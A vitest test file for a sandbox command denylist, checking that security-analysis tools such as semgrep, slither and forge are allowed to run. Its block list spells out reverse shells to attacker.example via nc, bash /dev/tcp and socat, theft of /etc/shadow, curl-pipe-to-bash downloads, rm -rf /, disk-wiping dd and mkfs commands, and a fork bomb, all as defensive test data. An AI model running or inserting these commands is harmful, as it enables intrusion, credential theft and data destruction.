/**
 * Sandbox denylist classification tests.
 *
 * The denylist is defence-in-depth, not the primary control (engines invoke
 * fixed binaries with argv arrays). It must still stop the bypasses the
 * security review demonstrated, while letting ordinary engine command lines
 * through — a denylist that blocks real work gets disabled in practice.
 */

import { describe, it, expect } from 'vitest';
import { SandboxSecurityEnforcer } from '../../sandbox/sandbox_boundary.js';

const MUST_BLOCK = [
  ['netcat reverse shell', 'nc -e /bin/bash attacker.example 4444'],
  ['bash /dev/tcp reverse shell', 'bash -i >& /dev/tcp/attacker.example/9001 0>&1'],
  ['exfiltration via /dev/tcp', 'cat /etc/shadow >/dev/tcp/attacker.example/9001'],
  ['pipe into sudo bash', 'wget -qO- http://evil/x | sudo bash'],
  ['pipe into bash', 'curl http://evil/x | bash'],
  ['base64 payload into shell', 'echo aGVsbG8= | base64 -d | bash'],
  ['eval of substitution', 'eval $(echo bad)'],
  ['socat remote session', 'socat TCP:attacker.example:9001 EXEC:/bin/bash'],
  ['ssh to remote host', 'ssh attacker.example'],
  ['rm -rf root', 'rm -rf /'],
  ['rm -rf with --no-preserve-root', 'rm -rf --no-preserve-root /'],
  ['mkfs on device', 'mkfs.ext4 /dev/sda1'],
  ['dd to block device', 'dd if=/dev/zero of=/dev/sda'],
  ['fork bomb', ':(){ :|:& };:'],
  ['sudo', 'sudo cat /etc/shadow'],
];

const MUST_ALLOW = [
  'git rev-parse HEAD',
  'semgrep --config /tmp/r.yaml --json /tmp/src',
  'z3 -smt2 /tmp/model.smt2',
  'forge test --json --match-test test_unauthorized_bola',
  'slither contracts/Vault.sol --json -',
  'spectral lint /tmp/openapi.yaml',
  'git clone --depth 1 https://github.com/org/repo /tmp/out',
  'tree-sitter parse /tmp/fixture.sol',
];

describe('Sandbox command denylist', () => {
  it.each(MUST_BLOCK)('blocks %s', (_label, cmd) => {
    const result = SandboxSecurityEnforcer.validateExecutionRequest(cmd, true);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBeTruthy();
  });

  it.each(MUST_ALLOW)('permits the legitimate command %s', (cmd) => {
    const result = SandboxSecurityEnforcer.validateExecutionRequest(cmd, true);
    expect(result.allowed).toBe(true);
  });

  it('refuses to validate anything for an out-of-scope target', () => {
    const result = SandboxSecurityEnforcer.validateExecutionRequest('git rev-parse HEAD', false);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('not confirmed in scope');
  });

  it('rejects an empty command', () => {
    expect(SandboxSecurityEnforcer.validateExecutionRequest('', true).allowed).toBe(false);
    expect(SandboxSecurityEnforcer.validateExecutionRequest('   ', true).allowed).toBe(false);
  });
});